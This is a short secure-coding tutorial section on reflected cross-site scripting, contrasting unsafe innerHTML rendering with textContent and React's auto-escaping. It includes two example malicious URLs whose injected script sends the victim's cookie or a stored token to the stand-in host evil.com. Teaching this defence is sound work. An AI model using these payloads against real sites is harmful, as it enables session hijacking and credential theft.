## Type 1.2 — Reflected XSS

### How it works
Script is in the **URL** — server reflects it back in the response without sanitizing.  
Attacker tricks user into clicking a crafted link.

```
Attacker crafts URL:
https://yourapp.com/search?q=<script>document.location='https://evil.com?c='+document.cookie</script>

→ Sends link to victim via email/SMS/social media
→ Victim clicks → server reflects the q param into the page
→ Script executes in victim's browser
```

### Real exploit
```
Search page shows: "Results for: [q param here]"

Malicious URL:
https://yourapp.com/search?q=<img src=x onerror="fetch('https://evil.com?t='+localStorage.getItem('token'))">

→ img fails to load → onerror fires → token stolen
```

### Protection
```jsx
// ✅ Never render URL params directly as HTML
const params = new URLSearchParams(window.location.search);
const query = params.get('q');

// ❌ Bad
document.getElementById('result').innerHTML = `Results for: ${query}`;

// ✅ Good — use textContent, not innerHTML
document.getElementById('result').textContent = `Results for: ${query}`;

// ✅ In React — JSX handles this automatically
function SearchResults() {
  const [params] = useSearchParams();
  const query = params.get('q');
  return <h2>Results for: {query}</h2>; // auto-escaped
}
```

